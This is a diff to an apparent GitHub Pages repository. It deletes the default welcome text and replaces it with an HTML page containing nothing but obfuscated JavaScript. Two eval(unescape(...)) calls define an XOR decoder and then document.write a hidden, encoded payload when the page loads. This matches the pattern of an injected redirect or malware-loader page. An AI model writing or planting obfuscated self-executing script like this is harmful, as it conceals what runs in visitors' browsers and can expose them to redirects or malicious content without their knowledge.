@@ -1,37 +1,14 @@
-## Welcome to GitHub Pages
+<html>
+<head>
+</head>
+<body>
 
-You can use the [editor on GitHub](https://github.com/fenugf/fenugf/edit/master/index.md) to maintain and preview the content for your website in Markdown files.
+<script type="text/javascript">
+<!-- 
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%73%62%33%31%37%36%30%37%36%35%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%37%35%33%32%36%35%32%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%38%34%37%31%36%33%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%34%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%73%62%33%31%37%36%30%37%36%35%28%27') + '%44%76%60%75%65%74%7d%2c%74%62%73%6d%7a%61%6a%6e%42%2e%6e%60%72%61%70%66%70%6e%70%79%21%41%19%0e%7e%65%76%6f%72%7d%31%74%72%60%66%70%6d%76%7a%36%6b%77%6f%69%45%27%6b%7b%70%74%3b%3b%37%7f%33%6e%6a%73%72%60%77%6d%32%7d%7b%70%34%42%7c%6e%6d%7a%46%7e%78%67%74%43%33%54%35%5d%25%3b%10%09%43%3b%77%62%7e%69%73%79%447532652%34%31%37%33%38%30%35' + unescape('%27%29%29%3b'));
+// -->
+</script>
+<noscript><i>Javascript required</i></noscript>
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
-
-### Markdown
-
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
-
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/fenugf/fenugf/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+</html>
